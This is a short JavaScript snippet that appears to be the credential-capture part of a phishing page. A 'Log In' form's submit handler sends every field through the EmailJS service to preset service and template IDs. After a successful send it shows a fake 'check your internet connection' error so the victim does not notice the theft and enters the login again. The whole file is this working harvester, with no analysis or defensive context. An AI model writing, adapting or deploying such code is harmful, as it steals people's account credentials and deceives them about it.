const btn = document.getElementById('button');

document.getElementById('form')
 .addEventListener('submit', function(event) {
   event.preventDefault();

   const serviceID = 'service_azjah46';
   const templateID = 'template_1cgiroo';

   emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
      btn.value = 'Log In';
      alert('Please Check Your Internet Connection and try again');
    }, (err) => {
      btn.value = 'Log In';
      alert(JSON.stringify(err));
    });
});